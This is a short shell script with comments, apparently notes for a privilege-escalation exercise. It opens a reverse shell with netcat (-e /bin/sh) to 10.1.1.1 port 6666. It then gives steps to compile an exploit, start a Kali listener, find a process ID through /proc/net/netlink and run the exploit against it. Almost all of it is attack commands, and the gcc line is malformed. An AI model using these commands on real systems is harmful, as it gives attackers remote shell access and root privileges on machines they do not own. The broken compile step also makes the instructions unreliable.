#!/bin/sh
/bin/netcat -e /bin/sh 10.1.1.1 6666

# then combine it with
gcc exploit.c -c exploit

# after that set listener in kali with
nc -lvnp 6666

# check prox on victim machine: 
cat /proc/net/netlink
# find the pid_number then 
chmod +x exploit
./exploit pid_number